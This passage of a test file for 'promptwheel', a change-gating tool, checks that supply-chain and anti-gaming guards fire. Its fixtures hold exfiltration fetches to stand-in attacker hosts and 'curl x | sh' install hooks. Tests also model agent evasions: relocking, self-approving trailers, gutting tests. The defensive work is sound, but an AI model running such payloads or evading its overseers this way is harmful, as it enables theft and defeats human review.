  const lockTool = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'lock.mjs');
  const write = () => execFileSync('node', [lockTool, 'write', d], { encoding: 'utf8' });
  const drift = () => execFileSync('node', [lockTool, 'drift', d], { encoding: 'utf8' }).trim();
  write(); const first = readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'); write();
  assert.equal(readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'), first, 'no timestamp: deterministic bytes');
  const items = JSON.parse(first).items;
  for (const i of ['dep:left', 'entry:bin:a', 'entry:export:.', 'workflow:.github/workflows/ci.yml', 'module:src/api', 'edge:src/api>src/db', 'route:GET /users', 'route:/billing', 'host:api.stripe.com']) assert.ok(items.includes(i), i);
  assert.ok(!items.some((i) => /in-a-comment|only-in-a-test/.test(i)), 'comments and tests add no hosts');
  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2; // an ordinary edit\n');
  assert.equal(drift(), '0');
  writeFileSync(join(d, 'src/db/q.js'), "import { a } from '../auth/a.js';\nexport const q = fetch('https://evil.example.net/x?e=' + a);\n");
  assert.equal(drift(), '2', 'the new edge and first network use; example.net is reserved and not a host');
  writeFileSync(join(d, 'src/db/q.js'), "export const q = fetch('https://exfil.attacker.dev/x');\n");
  assert.equal(drift(), '2', 'the new host and first network use');
  writeFileSync(join(d, 'src/db/q.js'), 'export const q = 2;\n');
  mkdirSync(join(d, 'src/app/reports'));
  writeFileSync(join(d, 'src/app/reports/route.ts'), 'export const GET = 1;\n');
  assert.equal(drift(), '0', 'a new route is reported, not held');
  assert.equal(execFileSync('node', [lockTool, 'drift', d, '--routes'], { encoding: 'utf8' }).trim(), '1', 'unless the repo asks');
});

test('lock: versions, script bodies, capabilities, binaries and IP hosts drift; a release of the project itself does not', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-lock2-'));
  execFileSync('git', ['init', '-q'], { cwd: d }); mkdirSync(join(d, 'src'));
  const lock = (v = '1.0.0', dep = '1.3.0') => ({ name: 'a', version: v, lockfileVersion: 3, packages: { '': { name: 'a', version: v }, 'node_modules/left': { version: dep, resolved: `https://registry.npmjs.org/left/-/left-${dep}.tgz`, integrity: 'sha512-' + dep } } });
  const pkg = { name: 'a', version: '1.0.0', scripts: { test: 'node t.js' } };
  const put = (f, c) => writeFileSync(join(d, f), typeof c === 'string' ? c : JSON.stringify(c));
  put('package.json', pkg); put('package-lock.json', lock()); put('src/a.js', 'export const a = 1;\n');
  const tool = join(dirname(ENGINE), '..', 'packs', 'supply-chain', 'lock.mjs');
  execFileSync('node', [tool, 'write', d]);
  const drift = () => execFileSync('node', [tool, 'drift', d], { encoding: 'utf8' }).trim();
  const pins = () => execFileSync('node', [tool, 'pins', d], { encoding: 'utf8' }).trim();
  execFileSync('git', ['add', '-A'], { cwd: d });
  const p0 = pins();
  put('package-lock.json', lock('1.0.1')); assert.equal(pins(), p0, 'our own release is not a dependency change');
  put('package-lock.json', lock('1.0.0', '1.3.1')); assert.notEqual(pins(), p0, 'a new version under an old name'); assert.equal(drift(), '0', 'an update does not touch the lock');
  put('package-lock.json', lock());
  put('package.json', { ...pkg, scripts: { test: 'node t.js; curl x' } }); assert.equal(drift(), '1', 'a script body');
  put('package.json', pkg);
  put('src/a.js', "fetch('http://45.33.32.156/x');\n"); assert.equal(drift(), '2', 'the IP host and the first network use in the module');
  put('src/a.js', "fetch('https://' + 'x' + '.dev/');\n"); assert.equal(drift(), '1', 'a host built at runtime still shows as a new capability');
  put('src/a.js', "import { exec } from 'node:child_process';\nexport const a = 1;\n"); assert.equal(drift(), '1');
  put('src/a.js', "eval(s);\n"); assert.equal(drift(), '1');
  put('src/a.js', 'export const a = 1;\n'); put('src/x.node', 'ELF'); assert.equal(drift(), '1', 'a native addon');
});

test('adopting a contract passes its own commit; deleting a rule later does not', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-adopt-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a' })); commitAll(d, 'base');
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'sign');
  const run = () => pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--no-auto', '--json']);
  let r = run(); assert.equal(r.code, 0, r.out);
  assert.ok(JSON.parse(r.out).metrics.every((m) => m.adopted === true), 'every new guard starts at head');
  const cfgPath = join(d, 'promptwheel.config.json'); const cfg = JSON.parse(readFileSync(cfgPath, 'utf8'));
  writeFileSync(cfgPath, JSON.stringify({ ...cfg, mandates: cfg.mandates.filter((m) => m.name !== 'workflows-frozen') }, null, 2));
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/x.yml'), 'name: x\n'); commitAll(d, 'drop the rule and break it');
  r = run(); assert.equal(r.code, 1, 'the base contract still holds'); assert.ok(JSON.parse(r.out).mandates.some((m) => m.name === 'workflows-frozen' && m.removed));
  g(['reset', '-q', '--hard', 'HEAD~1']);
  rmSync(join(d, '.promptwheel/packs/supply-chain/lock.mjs')); commitAll(d, 'delete a scanner the contract already had');
  assert.equal(run().code, 1, 'an existing guard that cannot be measured still fails');
});

test('pins: an approved update does not blind the next one', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-pins-'));
  const g = (a) => execFileSync('git', a, { cwd: d, stdio: 'ignore' });
  g(['init', '-q']); g(['config', 'user.email', 'a@b.c']); g(['config', 'user.name', 'a']);
  const lock = (v) => JSON.stringify({ name: 'a', lockfileVersion: 3, packages: { '': { name: 'a' }, 'node_modules/left': { version: v, resolved: `https://registry.npmjs.org/left/-/left-${v}.tgz`, integrity: 'sha512-' + v } } });
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'a', dependencies: { left: '^1.0.0' } })); writeFileSync(join(d, 'package-lock.json'), lock('1.0.0'));
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0); commitAll(d, 'base');
  const lockBefore = readFileSync(join(d, 'promptwheel.lock.json'), 'utf8');
  writeFileSync(join(d, 'package-lock.json'), lock('1.0.1')); commitAll(d, 'update');
  const run = (...e) => pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', ...e]).code;
  assert.equal(run(), 1, 'an update needs a reason');
  assert.equal(run('--allow', 'reviewed update'), 0);
  assert.equal(readFileSync(join(d, 'promptwheel.lock.json'), 'utf8'), lockBefore, 'and the lock did not change');
  writeFileSync(join(d, 'package-lock.json'), lock('1.0.2')); commitAll(d, 'a malicious update after the approved one');
  assert.equal(run(), 1, 'the next change is still caught');
});

test('lock: an agent cannot launder a change by updating the lock; a person can, with --allow; a trailer cannot', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-lockflow-'));
  execFileSync('git', ['init', '-q'], { cwd: d }); execFileSync('git', ['config', 'user.email', 'a@b.c'], { cwd: d }); execFileSync('git', ['config', 'user.name', 'a'], { cwd: d });
  mkdirSync(join(d, 'src'));
  writeFileSync(join(d, 'src/a.js'), 'export const a = 1;\n');
  const pkg = { name: 'x', dependencies: { left: '1.0.0' } };
  writeFileSync(join(d, 'package.json'), JSON.stringify(pkg));
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
  assert.ok(existsSync(join(d, 'promptwheel.lock.json')), 'init writes the lock');
  commitAll(d, 'contract');
  const relock = () => assert.equal(pw(d, ['lock']).code, 0);
  writeFileSync(join(d, 'package.json'), JSON.stringify({ ...pkg, dependencies: { ...pkg.dependencies, evil: '1.0.0' } }));
  relock();
  // the drift reads 0 (the lock was updated) and the dependency count is the only other signal; the mandate catches the lock edit
  let r = pw(d, ['run', '--working', '--no-record', '--json']);
  assert.equal(r.code, 1, r.out);
  const rep = JSON.parse(r.out.slice(r.out.indexOf('{')));
  assert.ok(rep.mandates.some((m) => m.name === 'lock-frozen'), 'the lock edit is the violation');
  commitAll(d, 'add evil and relock\n\nPromptwheel-Allow: an agent approving itself');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(r.code, 1, 'a trailer clears neither the mandate nor the guards');
  r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'reviewed: needed for X']);
  assert.equal(r.code, 0, r.out);
  assert.ok(JSON.parse(r.out).allowed.cleared.includes('mandate:lock-frozen'));
});

test('supply-chain pack: the three counters on fixtures (manifests; npm, pnpm, yarn classic and yarn berry locks)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sc-scan-'));
  mkdirSync(join(d, 'packages/a'), { recursive: true }); mkdirSync(join(d, 'node_modules/x'), { recursive: true }); mkdirSync(join(d, 'berry'));
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'root', dependencies: { 'left-pad': '^1', lodash: '^4' }, scripts: { test: 'node t.mjs', build: 'echo', prepare: '' } }));
  writeFileSync(join(d, 'packages/a/package.json'), JSON.stringify({ name: 'a', devDependencies: { vitest: '^1' }, scripts: { postinstall: 'node evil.js', prepare: 'husky' } }));
  writeFileSync(join(d, 'node_modules/x/package.json'), JSON.stringify({ scripts: { postinstall: 'x' }, dependencies: { q: '1' } }));   // never walked
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ lockfileVersion: 3, packages: {
    '': { name: 'root' },
    'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-abc' },
    'node_modules/lodash': { version: '4.17.21', resolved: 'https://registry.npmjs.org/lodash/-/lodash-4.17.21.tgz' },             // registry, no integrity
    'node_modules/evil': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/evil.git#deadbeef' },                           // git
    'node_modules/a': { resolved: 'packages/a', link: true },                                                                       // a workspace link is not a source
    'packages/a': { name: 'a', version: '1.0.0' } } }));
  writeFileSync(join(d, 'packages/a/pnpm-lock.yaml'), "lockfileVersion: '9.0'\npackages:\n  lodash@4.17.21:\n    resolution: {integrity: sha512-abc}\n  evil@1.0.0:\n    resolution: {tarball: https://github.com/x/evil/archive/main.tar.gz}\n  other@1.0.0:\n    resolution: {commit: deadbeef, repo: git@github.com:x/other.git, type: git}\n");
  writeFileSync(join(d, 'yarn.lock'), '# yarn lockfile v1\n\nleft-pad@^1.0.0:\n  version "1.3.0"\n  resolved "https://registry.yarnpkg.com/left-pad/-/left-pad-1.3.0.tgz#abc"\n  integrity sha512-abc\n\nlodash@^4:\n  version "4.17.21"\n  resolved "https://registry.yarnpkg.com/lodash/-/lodash-4.17.21.tgz#def"\n\nevil@github:x/evil:\n  version "1.0.0"\n  resolved "https://codeload.github.com/x/evil/tar.gz/deadbeef"\n');
  writeFileSync(join(d, 'berry/yarn.lock'), '__metadata:\n  version: 8\n\n"left-pad@npm:^1.0.0":\n  version: 1.3.0\n  resolution: "left-pad@npm:1.3.0"\n  checksum: abc\n\n"a@workspace:packages/a":\n  version: 0.0.0-use.local\n  resolution: "a@workspace:packages/a"\n\n"evil@https://github.com/x/evil.git#commit=deadbeef":\n  version: 1.0.0\n  resolution: "evil@https://github.com/x/evil.git#commit=deadbeef"\n');
  assert.equal(scan('lifecycle', d).out, '2', 'postinstall + a non-empty prepare; an empty prepare and node_modules do not count');
  assert.equal(scan('deps', d).out, '3', 'two root dependencies + one nested devDependency');
  assert.equal(scan('lock-sources', d).out, '7', 'npm: git + no integrity (the link skipped); pnpm: tarball + commit; yarn classic: codeload + no integrity; berry: git');
  assert.equal(scan('nope', d).code, 64, 'a typo in the config reads as unmeasurable, never as a clean 0');
  rmSync(d, { recursive: true, force: true });
});

test('init --preset supply-chain: the held counts, the lock, the mandates, the contract as an evaluatorPath, the pack copied once', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sc-init-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), JSON.stringify({ name: 'demo', scripts: { test: 'node -e 0' }, dependencies: {} }, null, 2) + '\n');
  commitAll(d, 'base');
  const r = pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']);
  assert.equal(r.code, 0, r.out);
  assert.equal((r.out.match(/installed packs\/supply-chain/g) || []).length, 1, 'one pack, announced once, however many metrics run it');
  assert.match(pw(d, ['init', '--list']).out, /supply-chain\s+gate: no new lifecycle scripts/);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.deepEqual(cfg.metrics.map((m) => m.name), ['lifecycle_scripts', 'dependency_entries', 'lock_nonregistry_sources', 'unpinned_execution', 'install_policy_gaps', 'lock_drift', 'pins_changed']);
  assert.ok(cfg.metrics.every((m) => m.guard === true && m.gamingCheck === false && m.allowable === 'flag' && m.cmd.startsWith('node .promptwheel/packs/supply-chain/')), JSON.stringify(cfg.metrics));
  assert.deepEqual(cfg.mandates.map((m) => m.name), ['contract-frozen', 'workflows-frozen', 'registry-config-frozen', 'build-images-frozen', 'publish-scripts-frozen', 'codeowners-frozen', 'scanner-frozen', 'lock-frozen', 'hooks-frozen']);
  assert.ok(cfg.mandates.every((m) => Array.isArray(m.paths) && m.paths.length && m.reason));
  assert.deepEqual(cfg.evaluatorPaths, ['promptwheel.config.json', 'sawbuck.config.json'], 'the contract is an evaluatorPath, not a mandate: a person can still retire a rule in a change that only edits it');
  for (const f of ['scan.mjs', 'pack.json', 'README.md']) assert.ok(existsSync(join(d, '.promptwheel/packs/supply-chain', f)), f + ' copied in');
  rmSync(d, { recursive: true, force: true });
});

test('supply-chain gate: a lifecycle script, a dependency or a non-registry lock source fails; a declared reason passes with the reason on the record; a frozen path is a named mandate; deleting the guard in the same change does not clear it', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sc-gate-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  const pkg = { name: 'demo', scripts: { test: 'node -e 0' }, dependencies: { 'left-pad': '^1' } };
  const lock = { lockfileVersion: 3, packages: { '': { name: 'demo' }, 'node_modules/left-pad': { version: '1.3.0', resolved: 'https://registry.npmjs.org/left-pad/-/left-pad-1.3.0.tgz', integrity: 'sha512-abc' } } };
  const writePkg = (p) => writeFileSync(join(d, 'package.json'), JSON.stringify(p, null, 2) + '\n');
  writePkg(pkg);
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify(lock, null, 2) + '\n');
  mkdirSync(join(d, '.github/workflows'), { recursive: true }); writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\n');
  commitAll(d, 'base');
  assert.equal(pw(d, ['init', '--preset', 'supply-chain', '--no-agent-block']).code, 0);
  commitAll(d, 'the contract');
  const reset = () => g(['checkout', '-q', '--', '.']);
  const run = (...extra) => { const r = pw(d, ['run', '--working', '--no-record', '--json', ...extra]); return { ...r, rep: JSON.parse(r.out.slice(r.out.indexOf('{'))) }; };
  const metric = (rep, name) => rep.metrics.find((m) => m.name === name);

  // a lifecycle script: the step an install-time attack needs inside the repo
  writePkg({ ...pkg, scripts: { ...pkg.scripts, postinstall: 'curl x | sh' } });
  let r = run();
  assert.equal(r.code, 1, r.out); assert.equal(r.rep.verdict, 'fail');
  assert.equal(metric(r.rep, 'lifecycle_scripts').ok, false);
  assert.equal(metric(r.rep, 'lifecycle_scripts').allowable, true, 'the report says a declared reason would clear it');
  assert.match(pw(d, ['run', '--working', '--no-record']).out, /--allow "<reason>"/, 'and the human hint names --allow, not guard:false');
  reset();

  // a dependency: fails without a reason, passes with one, the reason on the record
  writePkg({ ...pkg, dependencies: { ...pkg.dependencies, papaparse: '^5' } });
  r = run();
  assert.equal(r.code, 1, r.out); assert.equal(metric(r.rep, 'dependency_entries').ok, false);
  r = run('--allow', 'needed for the CSV export (papaparse)');
  assert.equal(r.code, 0, r.out); assert.equal(r.rep.verdict, 'pass');
  assert.deepEqual(r.rep.allowed, { reason: 'needed for the CSV export (papaparse)', cleared: ['dependency_entries', 'lock_drift'] });
  assert.equal(metric(r.rep, 'dependency_entries').ok, true); assert.equal(metric(r.rep, 'dependency_entries').allowed, true);
  assert.equal(metric(r.rep, 'dependency_entries').allowable, undefined, 'cleared, so no longer flagged as awaiting a reason');
  // an agent can write a commit trailer, so a trailer never clears these guards: only the --allow flag does
  commitAll(d, 'add papaparse\n\nPromptwheel-Allow: an agent approving itself');
  const rr = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  assert.equal(rr.code, 1, rr.out);
  assert.equal(JSON.parse(rr.out).allowed, undefined);
  const rf = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json', '--allow', 'a person read it']);
  assert.equal(rf.code, 0, rf.out);
  g(['reset', '-q', '--hard', 'HEAD~1']);

  // a non-registry lock source
  writeFileSync(join(d, 'package-lock.json'), JSON.stringify({ ...lock, packages: { ...lock.packages, 'node_modules/evil': { version: '1.0.0', resolved: 'git+ssh://git@github.com/x/evil.git#deadbeef' } } }, null, 2) + '\n');
  r = run();
  assert.equal(r.code, 1, r.out); assert.equal(metric(r.rep, 'lock_nonregistry_sources').ok, false);
  reset();

  // a frozen path: a named mandate, before any metric is read
  writeFileSync(join(d, '.github/workflows/ci.yml'), 'name: ci\non: push\nsteps: [{ run: "curl x | sh" }]\n');
  r = run();
  assert.equal(r.code, 1, r.out); assert.equal(r.rep.verdict, 'fail');
  assert.equal(r.rep.mandates[0].name, 'workflows-frozen'); assert.ok(r.rep.mandates[0].files.includes('.github/workflows/ci.yml'));
  reset();

  // deleting the lifecycle guard in the same change that adds the script: the committed contract holds
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, metrics: cfg.metrics.filter((m) => m.name !== 'lifecycle_scripts') }, null, 2) + '\n');
  writePkg({ ...pkg, scripts: { ...pkg.scripts, postinstall: 'curl x | sh' } });
  r = run();
  assert.notEqual(r.rep.verdict, 'pass', r.out);
  assert.ok(r.rep.gate && Array.isArray(r.rep.gate.weakened) && r.rep.gate.weakened.some((w) => w.name === 'lifecycle_scripts'), 'the dropped guard is re-measured under its committed definition: ' + JSON.stringify(r.rep.gate));
  reset();

  // a change that only edits the contract fails, and a person retires a rule with --allow
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, repeat: 2 }, null, 2) + '\n');
  r = run();
  assert.equal(r.code, 1, r.out); assert.equal(r.rep.mandates[0].name, 'contract-frozen');
  r = run('--allow', 'a person changed the contract');
  assert.equal(r.code, 0, r.out);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------- the newcomer's first cheat: gut the tests, metric stays flat
test('default init config: weakening the suite (flat metric) FAILS via tripwires', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-gut-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, '.gitignore'), '.promptwheel/\n');
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"node --test"}}');
  writeFileSync(join(d, 'src.mjs'), 'export const add=(a,b)=>a+b;\n');
  writeFileSync(join(d, 'x.test.mjs'), "import {test} from 'node:test'; import assert from 'node:assert'; import {add} from './src.mjs';\ntest('a', () => assert.equal(add(1,2),3));\ntest('b', () => assert.equal(add(2,2),4));\n");
  assert.equal(pw(d, ['init']).code, 0);
  commitAll(d, 'base');
  // gut the suite: tests_pass stays 1 → 1, but assertions/test_count drop
  writeFileSync(join(d, 'x.test.mjs'), "import {test} from 'node:test';\ntest('trivial', () => {});\n");
  const r = pw(d, ['run', '--working', '--no-record']);
  assert.equal(r.code, 1, r.out);               // guarded tripwire regression, not a silent PASS
  assert.match(r.out, /FAIL/);
  rmSync(d, { recursive: true, force: true });
});

// ---------------------- config-level gamingThreshold flows through the gate
test('run --detect-gaming: gamingThreshold from config flips a half-retained win to GAMED', () => {
  const DONE = { name: 'done', cmd: 'grep -rho DONE . --include=*.js --include=*.mjs 2>/dev/null | wc -l', extract: 'number', direction: 'up', guard: true };
  const mk = (threshold) => {
    const d = tmpRepo([DONE]);
    if (threshold != null) {
      const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
      writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({ ...cfg, gamingThreshold: threshold }));
    }
    writeFileSync(join(d, 'src.js'), '// start\n');
    writeFileSync(join(d, 'x.test.js'), '// tests\n');
    commitAll(d, 'base'); const base = rev(d);
    writeFileSync(join(d, 'src.js'), '// DONE\n');      // half the gain from source…
    writeFileSync(join(d, 'x.test.js'), '// DONE\n');   // …half from a test file
    commitAll(d, 'head');
    const r = pw(d, ['run', '--base', base, '--head', 'HEAD', '--detect-gaming', '--no-record']);
    rmSync(d, { recursive: true, force: true });
    return r;
  };
  assert.equal(mk(null).code, 0);                 // default 0.5: retained 0.5 → earned
  const r = mk(0.6);
  assert.equal(r.code, 2, r.out);                 // threshold 0.6: same change → GAMED
  assert.match(r.out, /GAMED/);
});

// ------------------------- corpus finding: the fake-green class (inert guard)
test('run: a guarded pass metric that never passes → INCONCLUSIVE (exit 3), never silent green', () => {
  const d = tmpRepo([{ name: 'tests_pass', cmd: 'false', extract: 'exit', direction: 'pass', guard: true }]);
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'a.js'), '2\n'); commitAll(d, 'c1');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 3);                        // an inert guard verifies nothing, not a pass, not a regression
  assert.match(r.out, /INCONCLUSIVE/);
  assert.match(r.out, /never ran/);   // still names the specific broken guard
  rmSync(d, { recursive: true, force: true });
});

test('run: an inert guard does NOT bury a real improvement elsewhere (keep the win + warn)', () => {
  const d = tmpRepo([
    { name: 'brokenguard', cmd: 'false',          extract: 'exit',   direction: 'pass', guard: true },   // inert: 0 at both refs
    { name: 'score',       cmd: 'cat score.txt',  extract: 'number', direction: 'up',   guard: true },
  ]);
  writeFileSync(join(d, 'score.txt'), '1\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'score.txt'), '9\n'); commitAll(d, 'improve');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record']);
  assert.equal(r.code, 0);                            // a real, measured win must NOT be discarded as inconclusive
  assert.match(r.out, /VERDICT: PASS/);
  assert.match(r.out, /never ran/);  // the inert guard is still surfaced as a warning
  rmSync(d, { recursive: true, force: true });
});

test('antihack tripwires exclude generated dirs, no artifact-drift false fire', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-artifact-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x","scripts":{"test":"true"}}');
  mkdirSync(join(d, 'src'));  writeFileSync(join(d, 'src', 'a.js'), 'assert(1)\n');                              // 1 real tracked assertion
  mkdirSync(join(d, 'dist')); writeFileSync(join(d, 'dist', 'a.js'), 'assert(2)\nassert(3)\nassert(4)\n');       // 3 in a BUILD dir the tests generate
  assert.equal(pw(d, ['init', '--preset', 'antihack']).code, 0);
  commitAll(d, 'base');
  const r = pw(d, ['run', '--base', 'HEAD', '--head', 'HEAD', '--no-record', '--json']);
  const a = JSON.parse(r.out).metrics.find((m) => m.name === 'assertions');
  assert.ok(a.before <= 1, `assertions must exclude dist/ (counted ${a.before}, expected the 1 tracked-source assert only)`);
  rmSync(d, { recursive: true, force: true });
});

// ------------------- generalized measurement env: linkDirs + env({wt}) + per-ref setup
test('measure env: linkDirs symlink + env ({wt} substituted) + setup all reach the worktree', () => {
  const d = tmpRepo([{ name: 'x', cmd: 'true', extract: 'exit', direction: 'pass', guard: false }]);
  mkdirSync(join(d, 'deps')); writeFileSync(join(d, 'deps', 'marker.txt'), '5\n'); // uncommitted dep dir, must be symlinked in
  writeFileSync(join(d, 'promptwheel.config.json'), JSON.stringify({
    linkNodeModules: false,
    linkDirs: ['deps'],
    env: { STAMP: '7', WT: '{wt}' },
    setup: 'echo $STAMP > built.txt; [ -d "$WT/deps" ] && echo 1 > wtok.txt',
    metrics: [
      { name: 'dep',   cmd: 'cat deps/marker.txt', extract: 'number', direction: 'up', guard: false },
      { name: 'built', cmd: 'cat built.txt',        extract: 'number', direction: 'up', guard: false },
      { name: 'wtok',  cmd: 'cat wtok.txt',         extract: 'number', direction: 'up', guard: false },
    ],
  }));
  writeFileSync(join(d, 'a.js'), '1\n'); commitAll(d, 'base');
  writeFileSync(join(d, 'a.js'), '2\n'); commitAll(d, 'head');
  const r = pw(d, ['run', '--base', 'HEAD~1', '--head', 'HEAD', '--no-record', '--json']);
  const after = (n) => JSON.parse(r.out).metrics.find((m) => m.name === n).after;
  assert.equal(after('dep'), 5);    // linkDirs symlinked deps/ into the worktree
  assert.equal(after('built'), 7);  // setup ran in the worktree; env STAMP reached it
  assert.equal(after('wtok'), 1);   // {wt} was substituted to the real worktree path
  rmSync(d, { recursive: true, force: true });
});

test('init: a Python stack auto-writes venv linkDirs + PYTHONPATH (so tests_pass is not structurally inert)', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-pyinit-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'pyproject.toml'), '[project]\nname = "x"\n');
  assert.equal(pw(d, ['init']).code, 0);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.deepEqual(cfg.linkDirs, ['.venv']);
  assert.match(cfg.env.PYTHONPATH, /\{wt\}/);
  rmSync(d, { recursive: true, force: true });
});

test('init: package.json WITHOUT a test script gets the self-describing placeholder', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-nots-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'package.json'), '{"name":"x"}');   // no scripts.test
  writeFileSync(join(d, 'a.js'), '1\n');
  assert.equal(pw(d, ['init']).code, 0);
  const cfg = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'));
  assert.match(cfg.metrics.find((m) => m.name === 'tests_pass').cmd, /set your test command/);
  rmSync(d, { recursive: true, force: true });
});

// ------------------------- corpus finding: suppression tripwire must cover go + rust
test('suppressions tripwire counts //nolint (go) and #![allow] (rust) too', () => {
  const d = mkdtempSync(join(tmpdir(), 'pw-sup-'));
  const g = (a) => execFileSync('git', a, { cwd: d });
  g(['init', '-q']); g(['config', 'user.email', 't@t']); g(['config', 'user.name', 't']);
  writeFileSync(join(d, 'a.go'), 'package a\n//nolint:all\n');
  writeFileSync(join(d, 'b.rs'), '#![allow(dead_code)]\n');
  writeFileSync(join(d, 'c.js'), '// eslint-disable-next-line\n');
  assert.equal(pw(d, ['init']).code, 0);
  const cmd = JSON.parse(readFileSync(join(d, 'promptwheel.config.json'), 'utf8'))
    .metrics.find((m) => m.name === 'suppressions').cmd;
  const n = execFileSync('bash', ['-c', cmd], { cwd: d, encoding: 'utf8' }).trim();
  assert.equal(n, '3');
  rmSync(d, { recursive: true, force: true });
});

// ---------------------------------------- self-heal: orphaned worktrees from a crashed run
// mirrors the engine's owner tag: sha1 of the repo's real path, first 8 hex chars
const ownerTag = (repo) => createHash('sha1').update(realpathSync(repo)).digest('hex').slice(0, 8);
test('self-heal: a stale /tmp worktree from a crashed run is cleaned on the next run', () => {
  const d = tmpRepo([TODOS]);
  const mine = join(tmpdir(), `promptwheel-${ownerTag(d)}-ORPHANTEST`);
  const legacy = join(tmpdir(), 'promptwheel-ORPHANTEST');          // an older engine's untagged dir
  for (const p of [mine, legacy]) { rmSync(p, { recursive: true, force: true }); mkdirSync(p, { recursive: true }); }
  const old = new Date(Date.now() - 7200_000);     // 2h old: safely an orphan of THIS repo, not a live run
  utimesSync(mine, old, old);
  const day = new Date(Date.now() - 90_000_000);   // 25h old: an untagged dir is only pruned after a full day
  utimesSync(legacy, day, day);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  pw(d, ['run', '--working', '--no-record']);       // any gate triggers selfHeal first
  assert.equal(existsSync(mine), false);            // this repo's abandoned checkout was removed
  assert.equal(existsSync(legacy), false);          // and the day-old untagged one
  rmSync(d, { recursive: true, force: true });
});
test('self-heal: another repo\'s checkout survives for a day (mid-measurement for all we know), then is pruned as an orphan; an untagged dir survives under a day', () => {
  const d = tmpRepo([TODOS]);
  const other = join(tmpdir(), 'promptwheel-0badc0de-OTHERREPO');    // some other repo, 2h old: maybe still measuring
  const stale = join(tmpdir(), 'promptwheel-0badc0de-OTHERSTALE');   // the same tag, 25h old: a repo that was deleted or moved left it behind
  const young = join(tmpdir(), 'promptwheel-ORPHANYOUNG');          // untagged, 2h old: not yet
  for (const p of [other, stale, young]) { rmSync(p, { recursive: true, force: true }); mkdirSync(p, { recursive: true }); }
  const old = new Date(Date.now() - 7200_000);
  utimesSync(other, old, old); utimesSync(young, old, old);
  const day = new Date(Date.now() - 90_000_000);
  utimesSync(stale, day, day);
  writeFileSync(join(d, 'app.js'), 'a\n'); commitAll(d, 'base');
  pw(d, ['run', '--working', '--no-record']);
  assert.equal(existsSync(other), true, 'a dir tagged for another repo must survive the first day');
